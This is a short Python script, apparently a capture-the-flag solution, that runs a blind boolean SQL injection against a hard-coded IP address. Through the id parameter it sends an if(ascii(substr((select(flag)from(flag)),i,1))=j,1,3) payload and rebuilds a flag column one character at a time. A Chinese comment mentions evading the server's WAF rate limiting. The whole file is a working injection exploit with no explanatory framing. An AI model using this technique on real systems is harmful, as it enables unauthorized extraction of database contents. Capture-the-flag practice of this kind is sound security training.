import requests
import time         #设置延时，避免得到flag乱码，也就是服务器waf，导致访问过快会有一段时间不能访问

url = "http://47.104.68.157:9002/"

flag = ""

for i in range(1,100):
    for j in range(32, 127):
        cur = "/?id=if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,3)"%(i,j)
        payload = url + cur
        if "HELLO" in requests.get(payload).text:
            flag += chr(j)
            print(flag)
            break
